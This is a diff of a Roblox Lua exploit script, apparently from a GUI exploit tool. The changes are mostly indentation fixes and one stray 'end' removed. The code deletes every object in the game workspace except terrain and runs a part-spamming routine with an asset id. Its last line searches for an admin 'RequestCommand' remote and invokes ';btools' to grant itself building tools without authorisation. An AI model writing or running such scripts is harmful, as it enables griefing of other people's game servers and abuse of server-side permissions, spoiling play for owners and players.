@@ -495,11 +495,11 @@ local function TBAGNK_fake_script() -- TextButton.LocalScript
 	end
 
 	function Sky(id)
-    for i,v in workspace:GetDescendants() do
-	if v.Name ~= "Terrain" then
-		DestroyPart(v)
-	end
-end
+		for i,v in workspace:GetDescendants() do
+			if v.Name ~= "Terrain" then
+				DestroyPart(v)
+			end
+		end
 		e = char.HumanoidRootPart.CFrame.x
 		f = char.HumanoidRootPart.CFrame.y
 		g = char.HumanoidRootPart.CFrame.z
@@ -521,7 +521,7 @@ end
 	end
 	Sky("139345933010644")
 	-----------------------------------
-		function spam(id)
+	function spam(id)
 		for i,v in game.workspace:GetDescendants() do
 			if v:IsA("BasePart") then
 				spawn(function()
@@ -548,7 +548,6 @@ end
 		end 
 	end
 	spam("139345933010644")  
-	end
 end
 task.wait(2)
 for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";btools") end end
